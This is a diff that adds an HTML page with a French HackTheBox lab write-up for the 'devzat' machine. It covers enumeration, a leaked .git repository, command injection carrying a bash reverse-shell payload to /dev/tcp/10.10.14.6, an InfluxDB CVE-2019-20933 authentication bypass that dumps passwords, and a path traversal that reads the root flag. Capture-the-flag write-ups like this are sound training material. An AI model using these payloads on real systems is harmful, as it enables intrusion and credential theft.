@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="fr-FR"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackTheBox devzat | kleman.pw</title>
+<meta property="og:title" content="HackTheBox devzat | kleman.pw" />
+<meta name="twitter:title" content="HackTheBox devzat | kleman.pw" />
+<meta itemprop="name" content="HackTheBox devzat | kleman.pw" />
+<meta name="application-name" content="HackTheBox devzat | kleman.pw" />
+<meta property="og:site_name" content="kleman.pw" />
+
+<meta name="description" content="Site web de kleman.">
+<meta itemprop="description" content="Site web de kleman." />
+<meta property="og:description" content="Site web de kleman." />
+<meta name="twitter:description" content="Site web de kleman." />
+
+<meta property="og:locale" content="fr-FR" />
+<meta name="language" content="fr-FR" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/posts/2022-03-17-htb-devzat/" title="" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/" />
+  <meta property="og:image" content="http://localhost:1313/" />
+  <meta name="twitter:image" content="http://localhost:1313/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2022-03-17T00:00:00Z />
+    <meta property="article:published_time" content=2022-03-17T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackTheBox devzat",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2022-03-17",
+        "description": "",
+        "wordCount":  1578 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2022-03-17",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kleman.pw"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.125.1">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/2022-03-17-htb-devzat/">
+    <link href="/style.min.18927ce2d0dc33c991e188f9b4efd25929b9589151125f809e2b3f45e447e971.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        Whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackTheBox devzat</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2022-03-17T00:00:00&#43;00:00" itemprop="datePublished"> Mar 17, 2022 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><strong><em>HTB</em></strong></p>
+<p><img src="/img/htb_devzat/head.png" alt=""></p>
+<h2 id="nmap"><strong>NMAP</strong></h2>
+<pre tabindex="0"><code>❯ nmap -sC -sV devzat.htb
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-25 14:51 CEST
+Nmap scan report for devzat.htb (10.10.11.118)
+Host is up (0.091s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
+|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
+|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: devzat - where the devs at
+8000/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey:
+|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-Go
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.92%I=7%D=10/25%Time=6176A857%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,C,&#34;SSH-2\.0-Go\r\n&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h2 id="http-enumeration"><strong>HTTP ENUMERATION</strong></h2>
+<p><img src="/img/htb_devzat/site.png" alt=""></p>
+<p>Le site web parle d&rsquo;un service de chat utilisant ssh sur le port 8000.
+Dans le code source il est mentioné HTML5UP, qui sont des template
+de html css et js.
+De plus nous ne remarquons pas de feature étrange sur le site,
+le site ne semble pas exploitable</p>
+<h2 id="service-ssh-port-8000"><strong>SERVICE SSH PORT 8000</strong></h2>
+<p><img src="/img/htb_devzat/ssh_8000.png" alt=""></p>
+<p>Nous arrivons dans un système de chat textuel avec un peu d&rsquo;enumeration,
+Nous remarquons plein de features, des minis jeux: le pendu, le morpions, etc.
+Aprés quelques essai d&rsquo;injection de commandes, Le service ne semblent pas vulnerable.</p>
+<h2 id="http-subdomain"><strong>HTTP SUBDOMAIN</strong></h2>
+<p>Les deux services ne semble pas vulnerable, essayons de fuzz le site web
+ainsi que les subdomains pour essayer de trouver quelque chose d&rsquo;interessant.
+Il se trouvera que le fuzz de subdomain est concluant</p>
+<pre tabindex="0"><code>❯ wfuzz -c  -w /home/poney/Wordlist/./subdomains-top1million-5000.txt -u &#39;http://devzat.htb&#39; -H &#34;Host: FUZZ.devzat.htb&#34;  --hw 26
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://devzat.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                          
+=====================================================================
+
+000003745:   200        20 L     35 W       510 Ch      &#34;pets&#34;
+</code></pre><h2 id="http-subdomain-petsdevzathtb"><strong>HTTP SUBDOMAIN pets.devzat.htb</strong></h2>
+<p><img src="/img/htb_devzat/web2.png" alt=""></p>
+<p>Nous trouvons rapidement un répertoire .git qui nous donne acces au code</p>
+<pre tabindex="0"><code>❯ wget -r http://pets.devzat.htb/.git
+[...]
+❯ git reset --hard
+HEAD est maintenant à ef07a04 back again to localhost only
+</code></pre><p>Nous pouvons maintenant analyser le code, dans le fichier main.go nous trouvons un élément interessant.</p>
+<pre tabindex="0"><code>func loadCharacter(species string) string {
+	cmd := exec.Command(&#34;sh&#34;, &#34;-c&#34;, &#34;cat characteristics/&#34;+species)
+	stdoutStderr, err := cmd.CombinedOutput()
+	if err != nil {
+		return err.Error()
+	}
+	return string(stdoutStderr)
+}
+</code></pre><p>L&rsquo;injection de commande saute aux yeux nous allons modifier la request web pour ajouter
+un ; et une autre commande.</p>
+<pre tabindex="0"><code>❯ curl &#39;http://pets.devzat.htb/api/pet&#39; \
+  --data-raw &#39;{&#34;name&#34;:&#34;aze&#34;,&#34;species&#34;:&#34;cat;/bin/bash -c \&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.6/1234 0&gt;&amp;1\&#34;&#34;}&#39; \
+  --compressed \
+  --insecure
+</code></pre><h2 id="privesc"><strong>PRIVESC</strong></h2>
+<p>Nous avons maintenant access aux codes source des deux sites web ainsi
+que du chat.
+Dans le code du système de chat, nous voyons des messages de bienvenue si nous prenons le user admin, catherine ou patrick.</p>
+<pre tabindex="0"><code>if strings.ToLower(u.name) == &#34;patrick&#34; {
+    u.writeln(&#34;admin&#34;, &#34;Hey patrick, you there?&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Sure, shoot boss!&#34;)
+    u.writeln(&#34;admin&#34;, &#34;So I setup the influxdb for you as we discussed earlier in business meeting.&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Cool :thumbs_up:&#34;)
+    u.writeln(&#34;admin&#34;, &#34;Be sure to check it out and see if it works for you, will ya?&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Yes, sure. Am on it!&#34;)
+    u.writeln(&#34;devbot&#34;, &#34;admin has left the chat&#34;)
+} else if strings.ToLower(u.name) == &#34;admin&#34; {
+    u.writeln(&#34;admin&#34;, &#34;Hey patrick, you there?&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Sure, shoot boss!&#34;)
+    u.writeln(&#34;admin&#34;, &#34;So I setup the influxdb for you as we discussed earlier in business meeting.&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Cool :thumbs_up:&#34;)
+    u.writeln(&#34;admin&#34;, &#34;Be sure to check it out and see if it works for you, will ya?&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Yes, sure. Am on it!&#34;)
+} else if strings.ToLower(u.name) == &#34;catherine&#34; {
+    u.writeln(&#34;patrick&#34;, &#34;Hey Catherine, glad you came.&#34;)
+    u.writeln(&#34;catherine&#34;, &#34;Hey bud, what are you up to?&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Remember the cool new feature we talked about the other day?&#34;)
+    u.writeln(&#34;catherine&#34;, &#34;Sure&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.&#34;)
+    u.writeln(&#34;catherine&#34;, &#34;Kinda busy right now :necktie:&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;That&#39;s perfectly fine :thumbs_up: You&#39;ll need a password I gave you last time.&#34;)
+    u.writeln(&#34;catherine&#34;, &#34;k&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;I left the source for your review in backups.&#34;)
+    u.writeln(&#34;catherine&#34;, &#34;Fine. As soon as the boss let me off the leash I will check it out.&#34;)
+    u.writeln(&#34;patrick&#34;, &#34;Cool. I am very curious what you think of it. See ya!&#34;)
+    u.writeln(&#34;devbot&#34;, &#34;patrick has left the chat&#34;)
+</code></pre><p>Trois choses sont interresante.</p>
+<ol>
+<li>La présence de la meme app de chat en dev sur le port 8443
+qui poséde une nouvelle feature interessante.</li>
+<li>Un service influxdb qui tourne sur la machine.</li>
+<li>Les sources sont dans des backups</li>
+</ol>
+<p>Le service en dev tourne avec des droits root, il est donc interresant.
+Nous trouvons vite les fichiers de backups dans /var/backups</p>
+<h2 id="forward-les-port-8443-et-8086"><strong>FORWARD LES PORT 8443 ET 8086</strong></h2>
+<pre tabindex="0"><code>ssh -NL 8443:127.0.0.1:8443 patrick@devzat.htb -i id_rsa
+ssh -NL 8086:127.0.0.1:8086 patrick@devzat.htb -i id_rsa
+</code></pre><p>Nous pouvons maintenant passer nmap sur les deux services.</p>
+<h2 id="devzat-dev"><strong>DEVZAT-DEV</strong></h2>
+<p>Aprés un peu d&rsquo;enumeration sur le nouveau service quelque chose
+nous saute aux yeux la commande /file qui permet de lire un fichier,
+malheureusement cette commande nous demande un password.</p>
+<pre tabindex="0"><code>❯ ssh -l aze 127.0.0.1 -p 8443
+The authenticity of host &#39;[127.0.0.1]:8443 ([127.0.0.1]:8443)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[127.0.0.1]:8443&#39; (ED25519) to the list of known hosts.
+Welcome to the chat. There are no more users
+devbot: aze has joined the chat
+aze: /commands
+[SYSTEM] Commands
+[SYSTEM] clear - Clears your terminal
+[SYSTEM] message - Sends a private message to someone
+[SYSTEM] users - Gets a list of the active users
+[SYSTEM] all - Gets a list of all users who has ever connected
+[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
+[SYSTEM] bell - Toggles notifications when you get pinged
+[SYSTEM] room - Changes which room you are currently in
+[SYSTEM] id - Gets the hashed IP of the user
+[SYSTEM] commands - Get a list of commands
+[SYSTEM] nick - Change your display name
+[SYSTEM] color - Change your display name color
+[SYSTEM] timezone - Change how you view time
+[SYSTEM] emojis - Get a list of emojis you can use
+[SYSTEM] help - Get generic info about the server
+[SYSTEM] tictactoe - Play tictactoe
+[SYSTEM] hangman - Play hangman
+[SYSTEM] shrug - Drops a shrug emoji
+[SYSTEM] ascii-art - Bob ross with text
+[SYSTEM] example-code - Hello world!
+[SYSTEM] file - Paste a files content directly to chat [alpha]
+aze: /file
+[SYSTEM] Please provide file to print and the password
+aze: /file /root/root.txt aze
+[SYSTEM] You did provide the wrong password
+aze:
+</code></pre><h2 id="influxdb"><strong>INFLUXDB</strong></h2>
+<pre tabindex="0"><code>❯ nmap -sC -sV 127.0.0.1 -p 8086
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-25 21:40 CEST
+Nmap scan report for arch (127.0.0.1)
+Host is up (0.00011s latency).
+
+PORT     STATE SERVICE VERSION
+8086/tcp open  http    InfluxDB http admin 1.7.5
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+</code></pre><p>Nous trouvons rapidement une exploit compatible avec notre version de influxdb.</p>
+<p><a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></p>
+<p>L&rsquo;exploit a besoin d&rsquo;une liste de user, nous prenons naturellement tout les users que nous avons croiser sur la box.</p>
+<pre tabindex="0"><code>patrick
+catherine
+root
+admin
+</code></pre><pre tabindex="0"><code>Start username bruteforce
+[x] patrick
+[x] catherine
+[x] root
+[v] admin
+</code></pre><p>Nous avons access a la base de donnée influxdb.
+Nous pouvons maintenant dumper la table.</p>
+<pre tabindex="0"><code>[devzat] Insert query (exit to change db): show field keys;
+{
+    &#34;results&#34;: [
+        {
+            &#34;series&#34;: [
+                {
+                    &#34;columns&#34;: [
+                        &#34;fieldKey&#34;,
+                        &#34;fieldType&#34;
+                    ],
+                    &#34;name&#34;: &#34;user&#34;,
+                    &#34;values&#34;: [
+                        [
+                            &#34;enabled&#34;,
+                            &#34;boolean&#34;
+                        ],
+                        [
+                            &#34;password&#34;,
+                            &#34;string&#34;
+                        ],
+                        [
+                            &#34;username&#34;,
+                            &#34;string&#34;
+                        ]
+                    ]
+                }
+            ],
+            &#34;statement_id&#34;: 0
+        }
+    ]
+}
+</code></pre><p>La table user est trés interessante.</p>
+<pre tabindex="0"><code>[devzat] Insert query (exit to change db): select * from &#34;user&#34;;
+{
+    &#34;results&#34;: [
+        {
+            &#34;series&#34;: [
+                {
+                    &#34;columns&#34;: [
+                        &#34;time&#34;,
+                        &#34;enabled&#34;,
+                        &#34;password&#34;,
+                        &#34;username&#34;
+                    ],
+                    &#34;name&#34;: &#34;user&#34;,
+                    &#34;values&#34;: [
+                        [
+                            &#34;2021-06-22T20:04:16.313965493Z&#34;,
+                            false,
+                            &#34;WillyWonka2021&#34;,
+                            &#34;wilhelm&#34;
+                        ],
+                        [
+                            &#34;2021-06-22T20:04:16.320782034Z&#34;,
+                            true,
+                            &#34;woBeeYareedahc7Oogeephies7Aiseci&#34;,
+                            &#34;catherine&#34;
+                        ],
+                        [
+                            &#34;2021-06-22T20:04:16.996682002Z&#34;,
+                            true,
+                            &#34;RoyalQueenBee$&#34;,
+                            &#34;charles&#34;
+                        ]
+                    ]
+                }
+            ],
+            &#34;statement_id&#34;: 0
+        }
+    ]
+}
+</code></pre><p>Aprés quelques essais nous trouvons le bon password pour l&rsquo;utilisateur catherine.</p>
+<blockquote>
+<p>catherine woBeeYareedahc7Oogeephies7Aiseci</p>
+</blockquote>
+<p>Nous pouvons maintenant lire les fichiers de backups de /var/backups qui nous permetterons
+de comprendre comment fonctionne la commande /file de devzat-dev.</p>
+<p>Dans le fichier commands.go nous trouvons un password hardcodé.</p>
+<pre tabindex="0"><code>func fileCommand(u *user, args []string) {
+	if len(args) &lt; 1 {
+		u.system(&#34;Please provide file to print and the password&#34;)
+		return
+	}
+
+	if len(args) &lt; 2 {
+		u.system(&#34;You need to provide the correct password to use this function&#34;)
+		return
+	}
+
+	path := args[0]
+	pass := args[1]
+
+	// Check my secure password
+	if pass != &#34;CeilingCatStillAThingIn2021?&#34; {
+		u.system(&#34;You did provide the wrong password&#34;)
+		return
+	}
+
+	// Get CWD
+	cwd, err := os.Getwd()
+	if err != nil {
+		u.system(err.Error())
+	}
+
+	// Construct path to print
+	printPath := filepath.Join(cwd, path)
+
+	// Check if file exists
+	if _, err := os.Stat(printPath); err == nil {
+		// exists, print
+		file, err := os.Open(printPath)
+		if err != nil {
+			u.system(fmt.Sprintf(&#34;Something went wrong opening the file: %+v&#34;, err.Error()))
+			return
+		}
+		defer file.Close()
+
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			u.system(scanner.Text())
+		}
+
+		if err := scanner.Err(); err != nil {
+			u.system(fmt.Sprintf(&#34;Something went wrong printing the file: %+v&#34;, err.Error()))
+		}
+
+		return
+
+	} else if os.IsNotExist(err) {
+		// does not exist, print error
+		u.system(fmt.Sprintf(&#34;The requested file @ %+v does not exist!&#34;, printPath))
+		return
+	}
+	// bokred?
+	u.system(&#34;Something went badly wrong.&#34;)
+}
+</code></pre><p>Maintenant nous pouvons passer par le service en dev qui tourne en root pour
+lire le flag</p>
+<pre tabindex="0"><code>aze: /file /root/root.txt CeilingCatStillAThingIn2021?
+[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
+aze: /file ../root.txt CeilingCatStillAThingIn2021?
+[SYSTEM] ef1b3ab4fd7812cc6b74c956190fffbe
+aze:
+</code></pre><p>Nous avons récupéré le flag avec succès.</p>
+<h2 id="conclusion"><strong>CONCLUSION</strong></h2>
+<p>Pour bien reussir cette machine il fallait bien lire les codes source des apps
+qui donnaient tout les indices nécessaire pour trouver notre chemin.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2024 Kleman.
+        
+    </small>
+</footer>
+
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
